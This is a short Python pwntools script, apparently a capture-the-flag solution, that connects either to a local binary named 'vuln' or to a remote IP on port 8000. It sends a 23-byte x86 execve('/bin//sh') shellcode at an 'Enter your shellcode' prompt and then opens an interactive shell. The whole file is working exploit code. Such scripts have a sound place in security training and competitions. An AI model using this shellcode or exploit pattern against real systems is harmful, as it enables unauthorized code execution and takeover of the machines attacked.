from pwn import *


# socat TCP-LISTEN:8000,reuseaddr,fork EXEC:./vuln
def main():

    if args["REMOTE"]:
        p = remote("3.15.247.173", 8000)
    else:
        p = process("./vuln")

    payload ='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

    p.sendlineafter("Enter your shellcode:", payload)
    p.interactive()


if __name__ == "__main__":
    main()
